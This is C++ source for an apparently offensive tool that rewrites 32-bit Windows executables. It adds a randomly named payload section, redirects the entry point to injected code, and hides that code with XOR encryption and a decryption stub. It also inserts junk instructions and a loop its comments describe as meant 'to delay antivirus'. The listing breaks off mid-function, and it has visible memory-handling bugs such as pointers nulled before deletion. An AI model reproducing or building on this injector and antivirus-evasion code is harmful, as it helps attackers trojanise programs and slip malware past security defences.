#include "morph_executable_controller.h"
#include "file_reader.h"
#include "file_saver.h"


//constructor
Morph_Executable_Controller::Morph_Executable_Controller()
{
    this->cur_wind = MainWindow::getMWptr();
    this->buffer = std::vector<char>();
    this->original_exe_name = QString("");
    this->original_exe_file_path = QString("");
    this->morphed_exe_name = QString("");
    this->dos_header_ptr = nullptr;
    this->image_NT_header_ptr = nullptr;
    this->image_NT_header_file_cursor = 0;
    this->image_dos_header_file_cursor = 0;
    this->exe_header_file_offset = 0;
    this->entry_point_of_text_section = 0;
    this->file_alignment = 0;
    this->section_alignment = 0;
    this->text_section_raw_data_offset = 0;
    this->text_section_header_ptr = nullptr;
    this->size_of_text_section = 0;
    this->index_of_text_section = 0;
    this->index_of_payload_section = 0;
    this->payload_section_header_ptr = nullptr;
    this->payload_num_of_bytes = 0;
    this->file_alignment_factor = 0;
    this->payload_raw_data_size = 0;
    this->section_alignment_factor = 0;
    this->payload_virtual_size = 0;
    this->payload_raw_address = 0;
    this->payload_virtual_address = 0;
    this->machine_code_num_of_bytes = 0;
    this->starting_of_text_section_offset_on_load = 0;
    this->image_base = 0;
    this->jump_to_payload_byte_length = 0;
    this->text_section_buffer_ptr = nullptr;
    this->text_section_buffer_original = nullptr;
    this->num_of_stosd = 0;
    this->buffer_cursor = 0;
    this->start_of_payload_section_offset = 0;
    this->random_key = 0;
    this->length_to_decrypt = 0;
    this->morph_status = QString("");
    this->disassembly_log = QString("");
}

//destructor
Morph_Executable_Controller::~Morph_Executable_Controller()
{
    this->dos_header_ptr = nullptr;
    delete this->dos_header_ptr;

    this->image_NT_header_ptr = nullptr;
    delete this->image_NT_header_ptr;

    this->text_section_header_ptr = nullptr;
    delete this->text_section_header_ptr;
	
    this->payload_section_header_ptr = nullptr;
    delete this->payload_section_header_ptr;

    this->text_section_buffer_ptr = nullptr;
    delete this->text_section_buffer_ptr;

    this->text_section_buffer_original = nullptr;
    delete this->text_section_buffer_original;

    for(int i = 0; i < this->image_section_header_vec.size(); i++)
    {
        delete this->image_section_header_vec[i];
    }

    this->image_section_header_vec.clear();

    this->cur_wind = nullptr;
    delete this->cur_wind;
}

QString Morph_Executable_Controller::get_disassembly_log()
{
    return this->disassembly_log;
}

//morphing section supporting/utility functions
QString Morph_Executable_Controller::read_file_into_vector(QString exe_file_path)
{
    this->original_exe_file_path = exe_file_path;
    File_Reader reader;
    return reader.read_file_into_vector(exe_file_path,this->buffer);
}

//get the image dos header
PIMAGE_DOS_HEADER Morph_Executable_Controller::get_ptr_image_dos_header(std::vector<char> &buffer, unsigned int image_dos_header_file_cursor)
{
    char* extracted_dos_header = new char[sizeof(IMAGE_DOS_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_DOS_HEADER); i++)
    {
		//loop will take all the bytes needed specifically for an image dos header
        extracted_dos_header[i] = buffer[image_dos_header_file_cursor + i];
    }
    return (PIMAGE_DOS_HEADER)extracted_dos_header;
}

//validating the dos header
QString Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
{
    if (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE)
    {
        return SUCCESS_VALID_DOS_SIGNATURE;//validating the dos signature
    }

    return ERROR_INVALID_DOS_SIGNATURE;
}

//get image nt headers32
PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::vector<char>&buffer, unsigned int image_NT_header_file_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_NT_HEADERS32)];

    for (int i = 0; i < sizeof(IMAGE_NT_HEADERS32); i++)
    {	
		//loop will take all the bytes needed specifically for an image nt headers 32
        extracted_NT_header[i] = buffer[image_NT_header_file_cursor + i];
    }
    return (PIMAGE_NT_HEADERS32)extracted_NT_header;
}

//validate the PE signature
QString Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
{
    if (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE)
    {
        return SUCCESS_VALID_PE_SIGNATURE;
    }

    return ERROR_INVALID_PE_SIGNATURE;
}

//randomize the paylaod section name
std::string Morph_Executable_Controller::randomize_payload_section_name()
{
    std::string alpha_num =  "0123456789"; // numbers
    alpha_num +=             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // uppercase letters
    alpha_num +=             "abcdefghijklmnopqrstuvwxyz"; // lowercase letters

    //new payload section must start with '.' character
    std::string name = ".";
    // randomization here
    for (int i = 1; i < IMAGE_SIZEOF_SHORT_NAME; i++)
    {
        name += alpha_num[rand() % (alpha_num.length())];
    }

    return name;
}

//put all image section headers into a vector
void Morph_Executable_Controller::store_image_section_headers_in_vec(std::vector<char> &buffer, std::vector<PIMAGE_SECTION_HEADER> &																	image_section_header_vec,PIMAGE_NT_HEADERS32& image_NT_header_ptr, 
																	unsigned int section_header_cursor)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        image_section_header_vec.push_back(get_ptr_image_section_header(buffer, section_header_cursor + i * sizeof(IMAGE_SECTION_HEADER)));
    }
}

//get image section header ptr
PIMAGE_SECTION_HEADER Morph_Executable_Controller::get_ptr_image_section_header(std::vector<char> &buffer, unsigned int section_header_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_SECTION_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_SECTION_HEADER); i++)
    {
		//loop will take all the bytes needed specifically for an image section header
        extracted_NT_header[i] = buffer[section_header_cursor + i];
    }

    return (PIMAGE_SECTION_HEADER)extracted_NT_header;
}

//get a section header by the name
QString Morph_Executable_Controller::get_section_header_index_by_name(const std::string section_name, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec, PIMAGE_NT_HEADERS32 &image_NT_header_ptr, int &index_of_section)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        if (section_name.compare((char*)image_section_header_vec[i]->Name) == 0)//name must be equal to what was passed in
        {
            index_of_section = i;
            return SUCCESS_MATCHING_SECTION_HEADER_NAME;//if same return
        }
    }
    return ERROR_NO_MATCHING_SECTION_HEADER_NAME;
}

//set the new section name
void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &payload_section, const std::string payload_section_name)
{
    for(int i = 0; i < payload_section_name.length(); i++)
    {
        payload_section->Name[i] =  payload_section_name[i];
    }
}

//get the payload radio button
int Morph_Executable_Controller::get_payload_radio_button()
{
    QString payload_type = this->cur_wind->get_payload_radio_button();

    for(int i = 0; i < LIST_OF_PAYLOADS_VEC.size(); i++)
    {
        if(payload_type == LIST_OF_PAYLOADS_VEC[i])//list of the radio button names
        {
            return i;
        }
    }

    return -1;//error
}

//calculate the file alignment
void Morph_Executable_Controller::calculate_file_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &file_alignment,unsigned int &file_alignment_factor)
{
    file_alignment_factor = payload_num_of_bytes / file_alignment;
    if(payload_num_of_bytes % file_alignment != 0) //must be round up by 200
    {
        file_alignment_factor++;//simple arithmetic instead of using a loop
    }
}

//calculate section alignment
void Morph_Executable_Controller::calculate_section_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &section_aligment,unsigned int &section_alignment_factor,
                                                                     PIMAGE_SECTION_HEADER &previous_section_header_ptr)
{
    section_alignment_factor = payload_num_of_bytes / section_aligment;
    unsigned int previous_virtual_size = previous_section_header_ptr->Misc.VirtualSize;
    if(previous_virtual_size % section_aligment != 0)//must be round up by 1000
    {
        section_alignment_factor++;//simple arithmetic instead of using a loop
    }
}

//initialize the payload section
void Morph_Executable_Controller::init_payload_section_header(PIMAGE_SECTION_HEADER &payload_section_header_ptr,
                                                              unsigned int &payload_raw_address,
                                                              unsigned int &payload_raw_data_size,
                                                              unsigned int &payload_virtual_address,
                                                              unsigned int &payload_virtual_size,
                                                              DWORD SECTIONCHARACTERISTICSTOSET)
{
    payload_section_header_ptr->PointerToRawData = payload_raw_address;
    payload_section_header_ptr->SizeOfRawData = payload_raw_data_size;
    payload_section_header_ptr->VirtualAddress = payload_virtual_address;
    payload_section_header_ptr->Misc.VirtualSize = payload_virtual_size;
    payload_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
}

//for debuggig purposes
void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec)
{
    std::cout << "PRINTING IMAGE SECTION HEADERS" << std::endl;
    std::cout << "===============================\n" << std::endl;
    for (auto i = 0; i < image_section_header_vec.size(); i++)
    {
        printf("NAME : %s\n", image_section_header_vec[i]->Name);
        printf("Virtual Size : 0x%x\n", image_section_header_vec[i]->Misc.VirtualSize);
        printf("Virtual Address : 0x%x\n", image_section_header_vec[i]->VirtualAddress);
        printf("Size of Raw Data : 0x%x\n", image_section_header_vec[i]->SizeOfRawData);
        printf("Pointer to Raw Data : 0x%x\n", image_section_header_vec[i]->PointerToRawData);
        printf("Pointer to Relocations : 0x%x\n", image_section_header_vec[i]->PointerToRelocations);
        printf("Pointer to Line Numbers : 0x%x\n", image_section_header_vec[i]->PointerToLinenumbers);
        printf("Number of Relocations: 0x%x\n", image_section_header_vec[i]->NumberOfRelocations);
        printf("Number of Line Numbers: 0x%x\n", image_section_header_vec[i]->NumberOfLinenumbers);
        printf("Charactertistics 0x%x\n", image_section_header_vec[i]->Characteristics);
        printf("-----------------------\n\n");
    }
}

//convert assembly syntax to bytes
QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
{
	//using keystone API
    ks_engine* ks;
    const char* code = asm_code.c_str();
    ks_err err;
    size_t count = 0;
    unsigned char *encode;
    err = ks_open(KS_ARCH_X86, KS_MODE_32, &ks);

    if (err != KS_ERR_OK)
    {
        printf("ERROR: failed on ks_open(), quit\n");
        return ERROR_OPENING_KEYSTONE;
    }
    if (ks_asm(ks, code, 0, &encode, &machine_code_num_of_bytes, &count) != KS_ERR_OK)//if error
    {
        printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
            count, ks_errno(ks));
        return ERROR_ASSEMBLY_FAILED_KEYSTONE;
    }

    printf("%s = ", code);
    for (int i = 0; i < machine_code_num_of_bytes; i++)
    {
        printf("%02x ", encode[i]);
        machine_code.push_back(encode[i]);//store to the vector
    }
    printf("\n");
    printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);

    // NOTE: free encode after usage to avoid leaking memory
    ks_free(encode);

    // close Keystone instance when done
    ks_close(ks);
    return SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE;
}

//get data from a specified section from the buffer which was read in
char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <char> &buffer, unsigned int file_offset, unsigned int size_of_section)
{
    char* section = new char[size_of_section];
    for (int i = 0; i < size_of_section; i++)
    {
        section[i] = buffer[file_offset + i];
    }
    return section;
}

//edit the beginning of text section to jump to payload 
void Morph_Executable_Controller::editing_text_section_ptr(char *&text_section_buffer_ptr, unsigned int jump_to_payload_byte_length, DWORD text_section_buffer_offset, std::vector<unsigned char> &machine_code_vec)
{
    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    for(int i = 0; i < jump_to_payload_byte_length; i++)
    {
        *(text_section_buffer_ptr + (text_section_buffer_offset)) = machine_code_vec[i];
        text_section_buffer_ptr++;
    }
}

//calculate how many times stosd must be called
void Morph_Executable_Controller::calculate_num_of_stosd_for_patching(std::string &text_section_memorized_entry_bytes,
                                                                      unsigned int &num_of_stosd,
                                                                      unsigned int jump_to_payload_byte_length,
                                                                      DWORD starting_of_text_section_offset,
                                                                      std::vector<char> &buffer)
{
    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    num_of_stosd = jump_to_payload_byte_length / sizeof(DWORD);
    if(jump_to_payload_byte_length % sizeof(DWORD) != 0)
    {
        num_of_stosd++;
    }

    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    for(int i = 0 ; i < sizeof(DWORD) * num_of_stosd; i++)
    {
        text_section_memorized_entry_bytes += buffer[starting_of_text_section_offset + i];
    }
}

//create the stosd asm syntax
void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patching_entry_bytes_asm,
                               std::string text_section_memorized_entry_bytes,
                               unsigned int num_of_stosd)
{
    if (text_section_memorized_entry_bytes.length() != 0)
    {
        for (int i = 0; i < num_of_stosd; i++)
        {
            //starting of patching entry bytes asm
            //need to store the original bytes of the text section
            patching_entry_bytes_asm += "mov eax, ";

            std::string big_endian_byte_string = "";
            for (int j = 0; j < sizeof(DWORD); j++)
            {
                if (j % sizeof(DWORD) == 0 && j != 0)
                {
                    //if correct format, no need to use this forloop to convert
                    break;
                }

                //upper and lower nibbles of a byte
                int upper, lower;
                char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

                upper = (text_section_memorized_entry_bytes[sizeof(DWORD)*i + j]);
                upper = (upper >> 4) & 0xf;//right shift and to zero off the leading 0s
                lower = text_section_memorized_entry_bytes[sizeof(DWORD)*i + j] & 0xf;//zero off the leading 0s

                //stored as big endian
                big_endian_byte_string += hex_array[upper];
                big_endian_byte_string += hex_array[lower];
            }
            //convert big endian to little endian because its 32 bit
            unsigned long hex_to_convert_to_little_endian = std::stoul(big_endian_byte_string, 0, 16);
            unsigned long hex_upper_lower_to_little_endian = _byteswap_ulong(hex_to_convert_to_little_endian);
            patching_entry_bytes_asm += convert_num_to_hex(hex_upper_lower_to_little_endian) + ";";
            patching_entry_bytes_asm += "stosd;";
        }
    }
}

//to populate the pointer which will then be used to reintialize the buffer
void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code,
	unsigned int size_of_machine_code)
{
    for (int i = 0; i < size_of_machine_code; i++)
    {
        *section_ptr = machine_code[i];
        section_ptr++;
    }
}

//put payload bytes into a vector
void Morph_Executable_Controller::populate_payload_vec(std::vector<unsigned char> &payload_vec, const char *payload_shell_code, unsigned int payload_num_of_bytes)
{
    for (int i = 0; i < payload_num_of_bytes; i++)
    {
        payload_vec.emplace_back(payload_shell_code[i]);
    }
}

std::string Morph_Executable_Controller::convert_byte_to_string(char byte)
{
    std::string result = "0x";

    char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

    for (int i = 0; i < sizeof(BYTE); i++)
    {
                        //upper and lower nibbles of a byte
        int upper, lower;
        upper = (byte >> 4) & 0xf;//right shift and to zero off the leading 0s
        lower = byte & 0xf;//zero off the leading 0s
        result += hex_array[upper];
        result += hex_array[lower];
    }

    return result;
}

//create jump back to text section asm syntax
void Morph_Executable_Controller::get_jump_back_to_text_section_instruction_asm(std::string &jump_back_to_text_section_asm, DWORD entry_point_of_text_section)
{
    jump_back_to_text_section_asm = "mov eax, " +
            convert_num_to_hex<DWORD>(entry_point_of_text_section)
            + ";";
    jump_back_to_text_section_asm += "jmp eax;";
}

//rewriting the new data into the buffer
void Morph_Executable_Controller::rewrite_bytes_to_buffer(std::vector<char> &buffer, char *section_buffer_ptr,
                             unsigned int offset, unsigned int byte_size)
{
    for (int i = 0; i < byte_size; i++)
    {
        buffer[offset + i] = section_buffer_ptr[i];
    }
}

void Morph_Executable_Controller::set_original_exe_name(QString original_exe_name)
{
    this->original_exe_name = original_exe_name;
}

QString Morph_Executable_Controller::get_morphed_exe_name()
{
    return this->morphed_exe_name;
}

QString Morph_Executable_Controller::get_original_exe_name()
{
    return this->original_exe_name;
}

QString Morph_Executable_Controller::get_morphed_exe_file_path()
{
    return this->morphed_exe_file_path;
}

void Morph_Executable_Controller::set_morphed_exe_file_path(QString exe_file_path)
{
	//using substring to set the morphed exe file path
    std::string original_exe_file_path = exe_file_path.toStdString().substr(0,exe_file_path.toStdString().find_last_of("/")+1);
    
	original_exe_file_path += this->morphed_exe_name.toStdString();
    std::cout << original_exe_file_path << std::endl;
    this->morphed_exe_file_path = QString(original_exe_file_path.c_str());
}

void Morph_Executable_Controller::set_morphed_exe_name(QString exe_file_path,std::string modifier)
{
	//using substring to get the exe name and set
    std::string original_exe_name = exe_file_path.toStdString().substr(exe_file_path.toStdString().find_last_of("/")+1,exe_file_path.length());
    set_original_exe_name(QString(original_exe_name.c_str()));

    std::size_t symbol = original_exe_name.find_last_of(".");
    std::string exe_name_no_extension = original_exe_name.substr(0,symbol);

    std::string new_exe_name = exe_name_no_extension + modifier + ".exe";
    this->morphed_exe_name = QString(new_exe_name.c_str());
}

//write the new exe 
void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, std::vector<char> &buffer)
{
    File_Saver saver;
    saver.write_exe_file(morphed_exe_file_path,buffer);
}

//create store edi asm syntax
void Morph_Executable_Controller::store_edi(std::string &store_payload_entry_point_in_edi_asm, DWORD entry_point_of_text_section)
{
    store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";"; //must store in destination index (EDI)
}

char Morph_Executable_Controller::generate_random_key()
{
    //key must be 0 to 255, max range is FF in hexadecimal
    return rand() % 256;
}

//add bytes into a vector
void Morph_Executable_Controller::add_bytes_into_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                     std::vector<unsigned char> machine_code_vec)
{
    for(int i = 0; i < machine_code_vec.size(); i++)
    {
        bytes_after_decryption_instructions_vec.emplace_back(machine_code_vec[i]);
    }
}

//XOR encryption
void Morph_Executable_Controller::encrypt_bytes_after_decryption_instruction_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                                                 char random_key)
{
    for(int i = 0; i < bytes_after_decryption_instructions_vec.size(); i++)
    {
        bytes_after_decryption_instructions_vec[i] = bytes_after_decryption_instructions_vec[i] ^ random_key;
    }
}

//get decryption asm syntax
void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
                                                     DWORD start_of_payload_section_offset,
                                                     unsigned int length_of_random_key,
                                                     std::vector<unsigned char> &machine_code_vec,
                                                     size_t &machine_code_num_of_bytes,
                                                     unsigned int size_of_bytes_after_decryption_instructions_vec)
{
    std::string decrypt_first_half_temp = "mov ecx, dword ptr[" +
            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];"; // this is to obtain the random key

    decrypt_first_half_temp += "xor ebx, ebx;";
    //this line will contain arbitrary address, will just be used to calculate the length of the
    //whole decryption function, note that this instructions will not actually be injected
    decrypt_first_half_temp += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset)+ ";";
    machine_code_vec.clear();

    //once again this is arbitrary, we just need the length of the first half of the
    //decryption function, note that this instructions will not actually be injected
    asm_to_machine_code(decrypt_first_half_temp,machine_code_vec,machine_code_num_of_bytes);

    unsigned int length_of_first_half = machine_code_num_of_bytes;

    std::string decrypt_second_half = "xor byte ptr [eax], cl;" ; // start decrypting from address of encrypted bytes, stored in eax
    decrypt_second_half += "inc ebx;"; // increase ebx, this acts as a counter
    decrypt_second_half += "inc eax;"; // increase eax, this adds the address + 1, this is to traverse the encrypted bytes

    if(size_of_bytes_after_decryption_instructions_vec <= 255)
    {
        decrypt_second_half += "cmp ebx, " +
                convert_byte_to_string(size_of_bytes_after_decryption_instructions_vec) +
                ";"; // this is the length of the total encrypted bytes, compares the counter with this, if it reaches, will stop "looping"
    }
    else // if it is bigger than 255, i.e. 0xFF
    {
        std::string num_of_bytes = convert_decimal_to_hexa(size_of_bytes_after_decryption_instructions_vec);
        decrypt_second_half += "cmp ebx, "
                + num_of_bytes
                +";";
    }
	
	//transform to machine code
    machine_code_vec.clear();
    asm_to_machine_code(decrypt_second_half,machine_code_vec,machine_code_num_of_bytes);

    //getting the length of the second half, this does not include the jne instruction yet
    unsigned int length_of_second_half = machine_code_num_of_bytes;

    //this is the total length of the decryption function
    unsigned int length_of_decryption_function = length_of_first_half + length_of_second_half;

    decrypt_asm = "mov ecx, dword ptr[" +
            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];";//this is to obtain the random key, which is at the first offset
    decrypt_asm += "xor ebx, ebx;"; // ebx acts as a counter
    decrypt_asm += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset +
                                                           length_of_decryption_function +
                                                           length_of_random_key +
                                                           (sizeof(BYTE) * 2)) + ";";//jne opcode + backwards jump opcode
                                                                                     //each is 1 byte, hence total is 2 bytes
	decrypt_asm += decrypt_second_half;
	
	machine_code_vec.clear();

    asm_to_machine_code(decrypt_asm,machine_code_vec,machine_code_num_of_bytes);

    calculate_jne_short_backwards(machine_code_vec,length_of_second_half, machine_code_num_of_bytes);
}

void Morph_Executable_Controller::calculate_jne_short_backwards(std::vector<unsigned char> &machine_code_vec,unsigned int length_of_jne,
																size_t &machine_code_num_of_bytes)
{
    //most efficient offsets are in this range, -128 to 127, in twos complement, binary
    //must be signed
    if(length_of_jne <= 128 && length_of_jne > 0)
    {
        machine_code_vec.emplace_back('\x75');
        //because the jne must start from the last 2 bytes
        //opcode of the JNE and the byte to jump to is 2 bytes
        length_of_jne += 2;

        // 2s complement
        length_of_jne = length_of_jne ^ 0xFF;
        length_of_jne += 1;
		std::string bytes = convert_byte_to_string(length_of_jne);
		machine_code_vec.emplace_back((BYTE)length_of_jne);
		machine_code_num_of_bytes += 2; // this is because we emplaced back 2 opcodes
    }
}

//place random key at the beginning of payload section
void Morph_Executable_Controller::add_random_key_to_payload_section_buffer_ptr(char *&payload_section_buffer_ptr, char random_key)
{
    *payload_section_buffer_ptr = random_key;
    payload_section_buffer_ptr++;
}

//transform bytes into assembly syntax
QString Morph_Executable_Controller::machine_code_to_asm(std::vector<unsigned char> payload_vec, std::vector<Disassembly> &dis_asm_vec)
{
	//using capstone API
    QString morph_status = SUCCESS_MACHINE_CODE_TO_ASSEMBLY_CAPSTONE;
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
        morph_status = ERROR_OPENING_CAPSTONE;
        return morph_status;
    }

    //the 0x1000 here is the address, we should replace this
    //the 0 here, means it will disassemble all the code, until there is either
    //no more code, or a broken instruction
    count = cs_disasm(handle, payload_vec.data(), payload_vec.size(), 0x1000, 0, &insn);
    if (count > 0) {
        size_t j;
        for (j = 0; j < count; j++)
        {
            int id = insn[j].id;
            int address = insn[j].address;
            std::string mnemonic = insn[j].mnemonic;
            std::string ops = insn[j].op_str;
            int size = insn[j].size;

            //ss << insn[j].mnemonic << " " << insn[j].op_str << ";";
            dis_asm_vec.emplace_back(Disassembly(id, address, mnemonic, ops, size, insn[j].bytes));
        }
    }
    else
    {
        morph_status = ERROR_DISASSEMBLY_FAILED_CAPSTONE;
    }

    cs_free(insn, count);
    cs_close(&handle);

    return morph_status;
}

std::string Morph_Executable_Controller::convert_decimal_to_hexa(int num)
{
    //this method is used to convert numbers bigger than 255 (0xFF) into bytes
    std::string hexaString = "";
    // char array to store hexadecimal number
    char hexaDeciNum[100];

    // counter for hexadecimal number array
    int i = 0;
    while(num!=0)
    {
        // temporary variable to store remainder
        int temp = 0;

        // storing remainder in temp variable.
        temp = num % 16;

        // check if temp < 10
        if(temp < 10)
        {
            hexaDeciNum[i] = temp + 48;
            i++;
        }
        else
        {
            hexaDeciNum[i] = temp + 55;
            i++;
        }

        num = num/16;
    }

    // printing hexadecimal number array in reverse order
    for(int j= i-1; j>=0; j--)
    {
        hexaString += hexaDeciNum[j];
    }

    hexaString = "0x" + hexaString;

    return hexaString;
}

//========================================== Junk Instructions & Conditional Jump ===================================

//check if you wanna insert based on probability
bool Morph_Executable_Controller::to_insert_or_not(int chance)
{
    //if within the probability then insert
    if (chance < this->INSERTION_PROBABILITY)
    {
        return true;
    }

    return false;
}

//checking whether the disassembled is a jump instruction
bool Morph_Executable_Controller::check_is_jump_instruction(int id)
{
    //id of all jump instructions according to capstone
    if (id >= 253 && id <= 270)
    {
        return true;
    }

    return false;
}

//conditional jump instruction to delay antivirus
std::string Morph_Executable_Controller::generate_conditional_jumps_instructions()
{
    std::string conditional_jump_instruction = "push ecx; mov ecx, 0x0; inc ecx; cmp ecx, 0xffffff; jne 0x6; pop ecx;";

    return conditional_jump_instruction;
}

//generate junk instructions
QString Morph_Executable_Controller::junk_code_generator(std::vector<unsigned char>& machine_code_vec, size_t &machine_code_num_of_bytes)
{
    QString morph_status = QString("");
	
    std::string junk_instructions = "push eax;nop;pop eax;";//for Proof of concept
    machine_code_vec.clear();
    morph_status = asm_to_machine_code(junk_instructions, machine_code_vec, machine_code_num_of_bytes);
    return morph_status;
}

//for debuggin purposes
void Morph_Executable_Controller::print_dis_asm_vec(std::vector<Disassembly> &dis_asm_vec)
{
    std::cout << "PRINTING DISASSEMBLY" << std::endl;
    std::cout << "======================================================" << std::endl;

    for (int i = 0; i < dis_asm_vec.size(); i++)
    {
        std::cout << dis_asm_vec[i] << std::endl;
    }

    std::cout << std::endl;
}

//store which addresses to add in the new junk instructions
void Morph_Executable_Controller::randomize_and_store_insertions(std::vector<uint64_t> &address_of_insertions_vec,
                                                                 std::vector<Disassembly> &jump_instructions_vec,
                                                                 std::vector<Disassembly> dis_asm_vec)
{
    std::string  register_array[] = { "eax", "ebx", "ecx", "edx", "ebp", "esp", "esi", "edi" };

    for (int i = 0; i < dis_asm_vec.size(); i++)
    {
        if (to_insert_or_not(rand() % 100) == true) //if wanna insert
        {
            std::string mnemonic = dis_asm_vec[i].get_mnemonic(); //get the mnemonic

            if (mnemonic.compare("call") == 0) //if mnemonic is "call"
            {
                std::string ops = dis_asm_vec[i].get_ops();
                for (int j = 0; j < 8; j++)
                {
                    if (ops.find(register_array[j]) != std::string::npos)//if the operand is a register then store, otherwise dont
                    {
                        address_of_insertions_vec.emplace_back(dis_asm_vec[i].get_address());
                        break;
                    }
                }
            }
            else
            {
                address_of_insertions_vec.emplace_back(dis_asm_vec[i].get_address());
            }
        }
		
        if (check_is_jump_instruction(dis_asm_vec[i].get_id()) == true) //checking if the it is a jmp instruction
        {
            jump_instructions_vec.emplace_back(dis_asm_vec[i]);
        }
    }
}

//initialize a tracker, need the original offsets for comparisons
void Morph_Executable_Controller::init_tracker_vec(std::vector<Disassembly> &tracker_vec,
                                                   std::vector<Disassembly> jump_instructions_vec)
{
    for (int i = 0; i < jump_instructions_vec.size(); i++)
    {
        tracker_vec.emplace_back(jump_instructions_vec[i]);
    }
}

//to adjust all offsets which are within a jump
void Morph_Executable_Controller::calculate_and_adjust_offsets_within_jump_range(std::vector<uint64_t> &address_of_insertions_vec,
                                                                                 std::vector<Disassembly> &jump_instructions_vec,
                                                                                 std::vector<Disassembly> tracker_vec,
                                                                                 size_t &machine_code_num_of_bytes)
{
    for (int i = 0; i < jump_instructions_vec.size(); i++)
    {
        for (int j = 0; j < address_of_insertions_vec.size(); j++)
        {
            adjust_offsets_within_jump_range(address_of_insertions_vec[j],
                                                jump_instructions_vec[i],
                                                tracker_vec[i],
                                                machine_code_num_of_bytes);
        }
    }
}

//method for adjusting the offsets within jumping
void Morph_Executable_Controller::adjust_offsets_within_jump_range(uint64_t &address_of_insertion,
                                                                   Disassembly &jump_instruction,
                                                                   Disassembly &tracker_instruction,
                                                                   size_t &machine_code_num_of_bytes)
{
    unsigned char original_relative_offset = jump_instruction.get_twos_complement_offset();
    int original_address_after_jumping = jump_instruction.get_address() + tracker_instruction.get_twos_complement_offset();

    unsigned char signed_bit = calculate_signed_bit(original_relative_offset);

    short temp = 0; //will be used for calculation

    //positive jump
    if (signed_bit == 0)
    {
        //within the positive jump offset
        if (address_of_insertion > jump_instruction.get_address() && address_of_insertion <= original_address_after_jumping)
        {
            std::cout << "[ + ] Positive offset jump and insertion @ 0x" << std::hex << address_of_insertion << " is within" << std::endl;
            std::vector<unsigned char> bytes_vec = jump_instruction.get_bytes_vec();
            temp = bytes_vec[1]; //get the first index which the the jumping offset
            temp += machine_code_num_of_bytes;

            //CHECKING
            std::cout << "Before : Jump instruction bytes : ";
            for (int i = 0; i < bytes_vec.size(); i++)
            {
                std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
            }
            std::cout << std::endl;

            //if it is not a near jump
            if (temp > 0x7f) {
                std::cout << "OH NO. IT IS NO LONGER A NEAR JUMP. PLEASE IMPLEMENT THIS EDGE CASE" << std::endl;
                // Here is where we need to find the correct jump bytes
                //exit(-1);
            }
            else
            {
                bytes_vec[1] = temp;
                jump_instruction.set_bytes_vec(bytes_vec);
            }

            std::cout << "After : Jump instruction bytes : ";
            bytes_vec = jump_instruction.get_bytes_vec();
            for (int i = 0; i < bytes_vec.size(); i++)
            {
                std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
            }

            std::cout << "\n[ + ] Jumping from 0x" << std::hex << jump_instruction.get_address() << " to 0x" << std::hex <<
                (jump_instruction.get_address() + temp) << std::endl;
        }
        else //THIS ONE JUST TO CHECK
        {
            std::cout << "[ + ] Positive offset jump but insertion @ 0x" << std::hex << address_of_insertion << " is not within" << std::endl;
            std::cout << "\nJumping from 0x" << std::hex << jump_instruction.get_address() << " to 0x" << std::hex <<
            (jump_instruction.get_address() + jump_instruction.get_twos_complement_offset()) << std::endl;
        }
    }
    else if (signed_bit == 1) //negative jump
    {
        if (address_of_insertion <= jump_instruction.get_address() && address_of_insertion > original_address_after_jumping)
        {
            std::cout << "[ - ]  Negative  offset jump and insertion @ 0x" << std::hex << address_of_insertion << " is within" << std::endl;
            std::vector<unsigned char> bytes_vec = jump_instruction.get_bytes_vec();
            temp = jump_instruction.get_twos_complement_offset() * -1;
            temp += machine_code_num_of_bytes;

            std::cout << "Before : Jump instruction bytes : ";
            for (int i = 0; i < bytes_vec.size(); i++)
            {
                std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
            }
            std::cout << std::endl;

            if (temp > 0x7f)
            {
